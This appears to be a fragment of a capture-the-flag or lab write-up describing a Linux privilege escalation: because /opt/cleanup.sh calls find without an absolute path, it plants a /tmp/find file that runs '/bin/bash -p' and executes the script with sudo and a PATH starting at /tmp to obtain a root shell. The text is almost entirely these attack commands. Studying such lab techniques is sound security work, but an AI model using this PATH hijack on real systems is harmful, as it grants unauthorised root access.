Well, there a find command without absolute path.
Privilege Escalate

Here step to get root.

    Move to /tmp and create find

cd /tmp
touch find
echo "/bin/bash -p" > find
chmod +x find

Run the /opt/cleanup.sh with environment set

sudo PATH=/tmp:$PATH /opt/cleanup.sh
